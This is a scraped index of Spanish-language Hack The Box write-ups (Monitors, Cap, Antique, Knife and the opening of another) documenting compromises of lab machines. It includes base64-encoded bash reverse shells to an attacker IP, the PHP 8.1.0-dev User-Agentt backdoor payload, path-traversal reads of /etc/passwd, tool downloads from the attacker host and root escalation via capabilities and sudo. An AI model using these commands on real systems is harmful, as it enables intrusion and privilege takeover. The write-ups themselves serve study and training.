\u0026#39;/usr/src/linux-headers-4.15.0-142-generic\u0026#39;  CC [M] /tmp/reverse.o  Building modules, stage 2.  MODPOST 1 modules  CC /tmp/reverse.mod.o  LD [M] /tmp/reverse.ko make[1]: Leaving directory \u0026#39;/usr/src/linux-headers-4.15.0-142-generic\u0026#39; root@4e5701e892a5:/tmp# insmod reverse.ko Y finalmente, se consiguen las dos flags:\nroot@4e5701e892a5:/tmp# ./.nc -nlvp 4444 Listening on [0.0.0.0] (family 0, port 4444) Connection from 172.17.0.1 40912 received! bash: cannot set terminal process group (-1): Inappropriate ioctl for device bash: no job control in this shell root@monitors:/# cat /home/marcus/user.txt efecb015501176da1d8423d3843cfd6b root@monitors:/# cat /root/root.txt 5650dab3b397032cb92cd8c859e069d1 Vía intencionada para conseguir user.txt Realmente, no había necesidad de conseguir user.txt antes que root.txt. Para conseguir user.txt, la idea era encontrar un script de Bash escondido en el directorio /home/marcus/.backup.\nwww-data@monitors:/home/marcus$ ls -la total 40 drwxr-xr-x 5 marcus marcus 4096 Jan 25 15:39 . drwxr-xr-x 3 root root 4096 Nov 10 2020 .. d--x--x--x 2 marcus marcus 4096 Nov 10 2020 .backup lrwxrwxrwx 1 root root 9 Nov 10 2020 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 marcus marcus 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 marcus marcus 3771 Apr 4 2018 .bashrc drwx------ 2 marcus marcus 4096 Jan 25 15:39 .cache drwx------ 3 marcus marcus 4096 Nov 10 2020 .gnupg -rw-r--r-- 1 marcus marcus 807 Apr 4 2018 .profile -r--r----- 1 root marcus 84 Jan 25 14:59 note.txt -r--r----- 1 root marcus 33 Jul 4 12:16 user.txt Como el directorio solo tiene permisos x, se pueden leer archivos solo si se conoce el nombre completo. Como el directorio se llama .backup, se puede tratar de adivinar qué tipo de archivos habrá dentro:\nwww-data@monitors:/home/marcus$ cat .backup/backup.sh #!/bin/bash  backup_name=\u0026#34;cacti_backup\u0026#34; config_pass=\u0026#34;VerticalEdge2020\u0026#34;  zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/* sshpass -p \u0026#34;${config_pass}\u0026#34; scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip rm /tmp/${backup_name}.zip Entonces, se podría acceder como marcus por SSH con contraseña VerticalEdge2020, y obtener una pista de que el contenedor de Docker podría ser vulnerable (note.txt). Además, se podría utilizar SSH para el reenvío de puertos en lugar de chisel.\nwww-data@monitors:/home/marcus$ su marcus Password: marcus@monitors:~$ cat note.txt TODO: Disable phpinfo in php.ini - DONE Update docker image for production use - marcus@monitors:~$ cat user.txt efecb015501176da1d8423d3843cfd6b ","image":"/images/HTB/Monitors/Monitors.png","permalink":"https://7rocky.github.io/htb/monitors/","section":"htb","summary":"Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web de Wordpress con un plugin vulnerable a navegación de directorios, otra página web vulnerable a inyección de código SQL y otra más vulnerable a deserialización insegura dentro de un contenedor de Docker con capabilities habilitadas. Para comprometer la máquina se necesitan conocimientos avanzados de enumeración web, vulnerabilidades y técnicas de explotación, además de técnicas de reenvío de puertos y para escapar de Docker. En este write-up se utiliza un script en Bash personalizado para explotar la deserialización insegura","time":10,"title":"Monitors"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.10.245   Fecha: 05 / 06 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.245 -p 21,22,80 Nmap scan report for 10.10.10.245 Host is up (0.052s latency).  PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open http gunicorn ... Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 132.74 seconds La máquina tiene abiertos los puertos 21 (FTP), 22 (SSH) y 80 (HTTP).\nEnumeración web La página web que se ve es la siguiente:\nSi pinchamos en \u0026ldquo;Security Snapshot\u0026rdquo;, la máquina realizará una captura de tráfico de red y nos permitirá descargar un archivo .pcap:\nSi nos fijamos en la URL, la captura es la número 2. Pero si cambiamos este número al 0, obtendremos una captura de tráfico con más datos (Insecure Direct Object Reference IDOR):\nUsando Wireshark para acceder por FTP Ahora se puede descargar un archivo 0.pcap. Usando Wireshark y filtrando por FTP, se pueden encontrar las siguientes credenciales de acceso: nathan:Buck3tH4TF0RM3!.\nAhora es posible conectarse a una sesión FTP:\n$ ftp nathan@10.10.10.245 Connected to 10.10.10.245. 220 (vsFTPd 3.0.3) 331 Please specify the password. Password: 230 Login successful. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -r-------- 1 1001 1001 33 Jun 03 12:32 user.txt 226 Directory send OK. ftp\u0026gt; get user.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for user.txt (33 bytes). WARNING! 1 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 33 bytes received in 0,00163 seconds (19,8 kbytes/s)  Podemos conseguir user.txt y leerla de manera local:\n$ cat user.txt 75a722ca7210ed19207176d03c571c52  Escalada de privilegios Además, las mismas credenciales son válidas para conectarse por SSH:\n$ ssh nathan@10.10.10.245 nathan@10.10.10.245's password: nathan@cap:~$  Después de ejecutar linpeas.sh se ve que /usr/bin/python3.8 tiene la capability cap_setuid activada. Podemos verificarlo manualmente:\nnathan@cap:~$ getcap -r / 2\u0026gt;/dev/null /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip /usr/bin/ping = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep  Entonces, con Python, se puede escalar privilegios fácilmente (más información en GTFOBins o en mi herramienta gtfobins-cli):\n$ gtfobins-cli --capabilities python python ==\u0026gt; https://gtfobins.github.io/gtfobins/python/ Capabilities If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID. cp $(which python) . sudo setcap cap_setuid+ep python ./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'  nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' root@cap:~# cat /root/root.txt 634be64976a543a6490b0656f928c293  ","image":"/images/HTB/Cap/Cap.png","permalink":"https://7rocky.github.io/htb/cap/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina contiene vulnerabilidades de referencias directas inseguras a archivos (IDOR) y capabilities a nivel de sistema. Para comprometer la máquina se necesita utilizar Wireshark para leer una captura de red y saber enumerar y explotar capabilities","time":2,"title":"Cap"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.11.107   Fecha: 27 / 09 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.107 -p 23 Nmap scan report for 10.10.11.107 Host is up (0.041s latency). PORT STATE SERVICE VERSION 23/tcp open telnet? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: | JetDirect | Password: | NULL: |_ JetDirect ... Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 166.81 seconds  La máquina tiene abierto el puerto 23 (Telnet).\nEnumeración Primero, nos conectamos a la máquina utilizando Telnet, y nos pregunta por una contraseña:\n$ telnet 10.10.11.107 23 Trying 10.10.11.107 Connected to 10.10.11.107. Escape character is '^]'. HP JetDirect password:  Podemos probar credenciales por defecto para la impresora JetDirect, pero ninguna funciona.\nEnumeración por SNMP Existe un exploit que muestra cómo las impresoras JetDirect exponen su contraseña por SNMP:\n$ searchsploit JetDirect ------------------------------------------------------------------------------- --------------------------- Exploit Title | Path ------------------------------------------------------------------------------- --------------------------- HP Jetdirect - Path Traversal Arbitrary Code Execution (Metasploit) | unix/remote/45273.rb HP JetDirect FTP Print Server - 'RERT' Denial of Service | windows/dos/29787.py HP JetDirect J3111A - Invalid FTP Command Denial of Service | hardware/dos/20090.txt HP JetDirect PJL - Interface Universal Directory Traversal (Metasploit) | hardware/remote/17635.rb HP JetDirect PJL - Query Execution (Metasploit) | hardware/remote/17636.rb HP JetDirect Printer - SNMP JetAdmin Device Password Disclosure | hardware/remote/22319.txt HP JetDirect rev. G.08.x/rev. H.08.x/x.08.x/J3111A - LCD Display Modification | hardware/remote/20565.c ------------------------------------------------------------------------------- --------------------------- Shellcodes: No Results $ searchsploit -x 22319 HP JetDirect J2552A/J2552B/J2591A/J3110A/J3111A/J3113A/J3263A/300.0 X Printer SNMP JetAdmin Device Password Disclosure Vulnerability source: https://www.securityfocus.com/bid/7001/info A problem with JetDirect printers could make it possible for a remote user to gain administrative access to the printer. It has been reported that HP JetDirect printers leak the web JetAdmin device password under some circumstances. By sending an SNMP GET request to a vulnerable printer, the printer will return the hex-encoded device password to the requester. This could allow a remote user to access and change configuration of the printer. C:\\\u0026gt;snmputil get example.printer public .1.3.6.1.4.1.11.2.3.9.1.1.13.0  Podemos ver si el puerto 161 (SNMP) está abierto utilizando un escaneo por UDP mediante nmap:\n# nmap -sU 10.10.11.107 -p 161 Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 10.10.11.107 Host is up (0.048s latency). PORT STATE SERVICE 161/udp open snmp Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds  Ahora, podemos utilizar snmpwalk de manera similar a como muestra el exploit:\n$ snmpwalk -v2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0 iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135  Acceso a la máquina La información anterior son caracteres representados en hexadecimal. Podemos escribir un script en Python llamado decode.py para decodificarlos (explicación detallada aquí).\nObtención de una contraseña Si tratamos de decodificar la lista completa de dígitos, obtendremos errores:\n$ python3 decode.py 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 binascii.Error Odd-length string  Podemos ir quitando dígitos por el final hasta no tener ningún error:\n$ python3 decode.py 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 P@ssw0rd@123!!123  Y con esto, tenemos la contraseña de la impresora y nos podemos conectar por Telnet:\n$ telnet 10.10.11.107 23 Trying 10.10.11.107 Connected to 10.10.11.107. Escape character is '^]'. HP JetDirect password: P@ssw0rd@123!!123 Please type \"?\" for HELP \u0026gt; ? To Change/Configure Parameters Enter: Parameter-name: value \u0026lt;Carriage Return\u0026gt; Parameter-name Type of value ip: IP-address in dotted notation subnet-mask: address in dotted notation (enter 0 for default) default-gw: address in dotted notation (enter 0 for default) syslog-svr: address in dotted notation (enter 0 for default) idle-timeout: seconds in integers set-cmnty-name: alpha-numeric string (32 chars max) host-name: alpha-numeric string (upper case only, 32 chars max) dhcp-config: 0 to disable, 1 to enable allow: \u0026lt;ip\u0026gt; [mask] (0 to clear, list to display, 10 max) addrawport: \u0026lt;TCP port num\u0026gt; (\u0026lt;TCP port num\u0026gt; 3000-9000) deleterawport: \u0026lt;TCP port num\u0026gt; listrawport: (No parameter required) exec: execute system commands (exec id) exit: quit from telnet session  Vemos que existe un comando llamado exec que permite ejecutar comandos de sistema:\n\u0026gt; exec id uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)  Por tanto, ahora nos podemos conectar a la máquina utilizando una reverse shell:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  \u0026gt; exec echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.107. Ncat: Connection from 10.10.11.107:54808. bash: cannot set terminal process group (812): Inappropriate ioctl for device bash: no job control in this shell lp@antique:~$ script /dev/null -c bash Script started, file is /dev/null lp@antique:~$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm lp@antique:~$ export TERM=xterm lp@antique:~$ export SHELL=bash lp@antique:~$ stty rows 50 columns 158  Enumeración del sistema Como usuario lp podemos leer la flag user.txt:\nlp@antique:~$ cat user.txt ea8fbeada4a37b5e23f862098f36d72b  Listando los puertos internos abiertos, vemos que el puerto 631 (IPP) está abierto:\nlp@antique:~$ netstat -nat | grep LISTEN Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:23 0.0.0.0:* LISTEN tcp6 0 0 ::1:631 :::* LISTEN  Para explorar este puerto, podemos realizar un reenvío de puertos utilizando chisel:\n$ ./chisel server -p 1337 --reverse server: Reverse tunnelling enabled server: Fingerprint lEVau5AqQ5yJn+cIJcdKHCOmSYVFY67kTuCt1JtmjtY= server: Listening on http://0.0.0.0:1337 server: session#1: tun: proxy#R:631=631: Listening  lp@antique:~$ cd /tmp lp@antique:/tmp$ curl 10.10.17.44/chisel -so chisel lp@antique:/tmp$ chmod +x chisel lp@antique:/tmp$ ./chisel client 10.10.17.44:1337 R:631:127.0.0.1:631 client: Connecting to ws://10.10.17.44:1337 client: Connected (Latency 109.928393ms)  Y ahora podemos acceder al puerto 631 desde nuestra máquina. Con el navegador, vemos que está ejecutando CUPS 1.6.1:\nEscalada de privilegios CUPS 1.6.1 tiene una vulnerabilidad de lectura de archivos (con permisos de root), encontrada aquí. Lo único que necesitamos es cambiar la configuración de CUPS para que el registro de errores apunte al archivo que queremos leer (/root/root.txt, /etc/shadow o lo que sea).\nNo tenemos permiso para cambiar la configuración desde el navegador porque necesitamos credenciales (la contraseña anterior no funciona):\nSin embargo, podemos utilizar cupsctl desde la máquina, porque el usuario lp pertenece al grupo lpadmin:\nlp@antique:/tmp$ cupsctl ErrorLog=\"/root/root.txt\"  Lectura de archivos como root Y ahora, podemos leer la flag root.txt (desde el navegador o mediante curl):\nlp@antique:/tmp$ curl -s http://localhost:631/admin/log/error_log fc93061adb9c109d8984391d4cdadeed  En este caso, no se puede conseguir una consola de comandos como root, ya que no hay servicio de SSH (y entonces root no tiene clave privada). Lo único que podríamos hacer es tratar de romper el hash de root en /etc/shadow con rockyou.txt, pero sin éxito.\n","image":"/images/HTB/Antique/Antique.png","permalink":"https://7rocky.github.io/htb/antique/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina es una impresora HP JetDirect que expone la contraseña por SNMP y tiene una vulnerabilidad de lectura privilegiada de archivos. Para comprometer la máquina se necesitan técnicas de enumeración por SNMP y reenvío de puertos. En este write-up se utiliza un programa en Java personalizado para automatizar un ataque de SQLi","time":5,"title":"Antique"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.10.242   Fecha: 22 / 05 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.242 -p 22,80 Nmap scan report for 10.10.10.242 Host is up (0.053s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA) | 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA) |_ 256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Emergent Medical Idea Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.72 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración Si vamos a http://10.10.10.242, veremos una página como esta:\nLa respuesta HTTP del servidor contiene una cabecera que indica que se está utilizando PHP/8.1.0-dev:\n$ curl 10.10.10.242 -I HTTP/1.1 200 OK Date: Server: Apache/2.4.41 (Ubuntu) X-Powered-By: PHP/8.1.0-dev Content-Type: text/html; charset=UTF-8  El problema de esta versión es que se publicó con una puerta trasera (backdoor). Si se pone la cabecera User-Agentt: zerodiumsystem(\u0026quot;whoami\u0026quot;); en la petición, se ejecutará el comando whoami (más información aquí).\nAcceso a la máquina Para acceder a la máquina, vamos a ejecutar una reverse shell:\n$ echo -n 'bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4444 0\u0026gt;\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ curl 10.10.10.242 -H 'User-Agentt: zerodiumsystem(\"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash\");'  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.242. Ncat: Connection from 10.10.10.242:54378. bash: cannot set terminal process group (950): Inappropriate ioctl for device bash: no job control in this shell james@knife:/$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null james@knife:/$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm james@knife:/$ export TERM=xterm james@knife:/$ export SHELL=bash james@knife:/$ stty rows 50 columns 158  Enumeración del sistema Se accede a la máquina como usuario james:\njames@knife:/$ cd james@knife:~$ cat user.txt 3c9359d46d35b73071095b9ef4e0dcf0  Este usuario puede ejecutar knife como root sin proporcionar contraseña:\njames@knife:~$ sudo -l Matching Defaults entries for james on knife: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User james may run the following commands on knife: (root) NOPASSWD: /usr/bin/knife  Escalada de privilegios Después de leer la ayuda de knife, se ve que se puede ejecutar un script de Ruby con knife exec. Entonces, se puede conseguir que root ejecute /bin/bash desde Ruby. También podemos mirar en GTFOBins o utilizar mi herramienta gtfobins-cli:\n$ gtfobins-cli --sudo knife knife ==\u0026gt; https://gtfobins.github.io/gtfobins/knife/ Sudo If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. sudo knife exec -E 'exec \"/bin/sh\"'  james@knife:~$ sudo knife exec -E 'exec \"/bin/bash\"' root@knife:/home/james# cd root@knife:~# cat root.txt b631aac1a84b2e5cf9063d641735eb59  ","image":"/images/HTB/Knife/Knife.png","permalink":"https://7rocky.github.io/htb/knife/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina contiene una página web en una versión de PHP con una puerta trasera y permisos de sudo configurados. Para comprometer la máquina se necesita conocer la versión de PHP y técnicas básicas de escalada de privilegios","time":2,"title":"Knife"},{"contents":"  SO: Linux   Dificultad: Insana   Dirección IP: 10.10.10.148   Fecha: 03 / 08 / 2019   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.148 -p 22,9999 Nmap scan report for 10.10.10.148 Host is up (0.058s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 56:84:89:b6:8f:0a:73:71:7f:b3:dc:31:45:59:0e:2e (RSA) | 256 76:43:79:bc:d7:cd:c7:c7:03:94:09:ab:1f:b7:b8:2e (ECDSA) |_ 256 b3:7d:1c:27:3a:c1:78:9d:aa:11:f7:c6:50:57:25:5e (ED25519) 9999/tcp open abyss? | fingerprint-strings: | GetRequest, HTTPOptions: | HTTP/1.1 200 OK | Accept-Ranges: bytes | Cache-Control: no-cache | Content-length: 4871 | Content-type: text/html | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\"en\"\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;Login V10\u0026lt;/title\u0026gt; | \u0026lt;meta charset=\"UTF-8\"\u0026gt; | \u0026lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u0026gt; | \u0026lt;!--===============================================================================================--\u0026gt; | \u0026lt;link rel=\"icon\" type=\"image/png\" href=\"images/icons/favicon.ico\"/\u0026gt; | \u0026lt;!--===============================================================================================--\u0026gt; | \u0026lt;link rel=\"stylesheet\" type=\"text/css\" href=\"vendor/bootstrap/css/bootstrap.min.css\"\u0026gt; | \u0026lt;!--===============================================================================================--\u0026gt; | \u0026lt;link rel=\"stylesheet\" type=\"text/css\" href=\"fonts/font-awesome-4.7.0/css/font-awesome.min.css\"\u0026gt; |_ \u0026lt;!--=============================================== Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 146.57 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 9999 (HTTP).\nEnumeración Si vamos a http://10.10.10.148:9999, veremos un formulario de inicio de sesión:\nPodemos probar algunas credenciales, pero vemos \u0026ldquo;File not found\u0026rdquo;:\nVamos a aplicar fuzzing para enumerar más rutas:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.148:9999/FUZZ images [Status: 200, Size: 225, Words: 9, Lines: 3, Duration: 52ms] css [Status: 200, Size: 317, Words: 11, Lines: 4, Duration: 298ms] js [Status: 200, Size: 226, Words: 9, Lines: 3, Duration: 37ms] vendor [Status: 200, Size: 1011, Words: 25, Lines: 11, Duration: 4466ms] fonts [Status: 200, Size: 643, Words: 17, Lines: 7, Duration: 64ms]  Si vamos a algunas de las rutas de arriba, veremos un listado de directorios:\nVamos a probar con otro diccionario para probar vulnerabilidades de navegación de directorios:\n$ ffuf -w $WORDLISTS/wfuzz/Injections/Traversal.txt -u http://10.10.10.148:9999/FUZZ ../../../../../../../../../../../../etc/hosts [Status: 200, Size: 273, Words: 21, Lines: 10, Duration: 538ms] ../../../../../../../../../../../../etc/hosts%00 [Status: 200, Size: 273, Words: 21, Lines: 10, Duration: 539ms] ../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 539ms] /../../../../../../../../../../../etc/passwd%00.jpg [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 540ms] ../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 540ms] /./././././././././././etc/passwd [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 562ms] /../../../../../../../../../../etc/passwd [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 577ms] /../../../../../../../../../../../etc/passwd%00.html [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 577ms] /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 79ms]  Vaya, eso era inesperado.\nAcceso a la máquina Entonces, podemos leer /etc/passwd (realmente, solamente tenemos que agregar la ruta a la URL):\n$ curl 10.10.10.148:9999//etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin r4j:x:1000:1000:r4j:/home/r4j:/bin/bash john:x:1001:1001:,,,:/home/john:/bin/bash $ curl 10.10.10.148:9999//etc/passwd -s | grep sh$ root:x:0:0:root:/root:/bin/bash r4j:x:1000:1000:r4j:/home/r4j:/bin/bash john:x:1001:1001:,,,:/home/john:/bin/bash  Perfecto, hay tres usuarios disponibles en la máquina: root, r4j y john.\nExplotación de Directory Path Traversal En este punto, vamos a enumerar la tecnología que está detrás del servidor web. Podemos extraer esta información mirando en /proc/self/cmdline:\n$ curl 10.10.10.148:9999//proc/self/cmdline -vso - * Trying 10.10.10.148:9999... * Connected to 10.10.10.148 (10.10.10.148) port 9999 (#0) \u0026gt; GET //proc/self/cmdline HTTP/1.1 \u0026gt; Host: 10.10.10.148:9999 \u0026gt; User-Agent: curl/7.84.0 \u0026gt; Accept: */* \u0026gt; * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 200 OK \u0026lt; Accept-Ranges: bytes \u0026lt; Cache-Control: no-cache \u0026lt; Content-length: 0 \u0026lt; Content-type: text/plain \u0026lt; * Connection #0 to host 10.10.10.148 left intact $ nc 10.10.10.148 9999 \u0026lt;\u0026lt;\u0026lt; $'GET //proc/self/cmdline HTTP/1.1\\n\\n' HTTP/1.1 200 OK Accept-Ranges: bytes Cache-Control: no-cache Content-length: 0 Content-type: text/plain  Pero no sale nada\u0026hellip; Vamos a listar el directorio /proc/self:\nParece que todos los archivos están vacíos, a excepción de /proc/self/exe, que es un enlace simbólico al binario que está siendo ejecutado.\nPodemos descargarlo y analizarlo. De hecho, se trata de un ELF de 32 bits:\n$ curl 10.10.10.148:9999//proc/self/exe -so exe $ file exe content/exe: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e4e105bd11d096b41b365fa5c0429788f2dd73c3, not stripped  Además, podemos acceder a /proc/self/cwd y listar todos los archivos en el directorio actual de trabajo del binario:\nEl binario se llama httpserver, y usa run.sh para correr (obviamente):\n$ curl 10.10.10.148:9999//proc/self/cwd/run.sh  #!/bin/bash source/home/john/.bashrc whiletrue; docd/opt/www; ./httpserver; done  Analizando el binario httpserver Para analizar el binario, podemos usar Ghidra y ver el código en C descompilado. Esta es la función main:\nvoidmain(intparam_1, intparam_2) { intiVar1; intiVar2; intin_GS_OFFSET; socklen_tlocal_140; intlocal_13c; char*local_138; intlocal_134; intlocal_130; intlocal_12c; intlocal_128; sockaddr local_124; charlocal_114[256]; undefined4 local_14; undefined4 *puStack16;  iVar1 =param_2; iVar2 =param_1; puStack16 =\u0026amp;param_1; local_14 =*(undefined4 *) (in_GS_OFFSET +0x14); local_13c =9999; local_138 =getcwd(local_114, 0x100); local_140 =0x10; if(iVar2 ==2) { if((**(char**) (iVar1 +4) \u0026lt;'0') ||('9'\u0026lt;**(char**) 